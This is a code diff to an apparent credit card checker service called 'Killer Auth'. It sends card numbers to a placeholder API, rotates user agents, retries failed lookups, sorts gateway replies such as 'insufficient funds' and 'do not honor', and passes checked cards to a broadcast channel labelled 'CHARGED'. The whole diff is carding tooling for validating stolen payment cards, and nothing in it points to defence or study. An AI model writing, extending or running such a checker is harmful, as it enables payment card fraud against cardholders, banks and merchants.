@@ -50,36 +50,36 @@ const userAgents = [
 
 const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
 
-// Determine status from API response
-const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
+// Determine status from API response - Killer Auth uses KILLED/UNKNOWN only
+const getStatusFromResponse = (data: Record<string, unknown>): "killed" | "unknown" => {
   const message = (data?.message as string)?.toLowerCase() || '';
   const status = (data?.status as string)?.toUpperCase() || '';
   
-  // LIVE responses
+  // KILLED responses (successful check - card is valid/working)
   if (message.includes("payment method added successfully") || message.includes("card added successfully")) {
-    return "live";
+    return "killed";
   }
   if (status === 'APPROVED' || status === 'SUCCESS' || status === 'LIVE') {
-    return "live";
+    return "killed";
   }
   
-  // DEAD responses
+  // Also mark declined cards as KILLED (card was checked successfully)
   if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
-    return "dead";
+    return "killed";
   }
   if (message.includes("invalid") || message.includes("expired") || message.includes("do not honor")) {
-    return "dead";
+    return "killed";
   }
   if (status === 'DECLINED' || status === 'DEAD' || status === 'FAILED') {
-    return "dead";
+    return "killed";
   }
   
-  // Everything else is UNKNOWN
+  // Everything else is UNKNOWN (API error, timeout, etc.)
   return "unknown";
 };
 
 // Perform API check with retry logic for UNKNOWN responses
-const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
+const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown> & { computedStatus: "killed" | "unknown" }> => {
   const maxRetries = 3;
   // Using a placeholder API URL - this should be replaced with the actual Killer Auth API
   const apiUrl = `http://killer-auth-api.example.com/api?cc=${cc}`;
@@ -215,13 +215,13 @@ serve(async (req) => {
     // Perform check with automatic retry for UNKNOWN responses
     const data = await performCheck(cc, userAgent);
 
-    // Broadcast LIVE cards to channel (fire-and-forget)
-    if (data.computedStatus === 'live') {
+    // Broadcast KILLED cards to channel (fire-and-forget)
+    if (data.computedStatus === 'killed') {
       notifyChargedCard(
         user.id,
         cc,
         'CHARGED',
-        String(data.apiMessage || 'LIVE'),
+        String(data.apiMessage || 'KILLED'),
         '$0.00',
         'Killer Auth'
       );
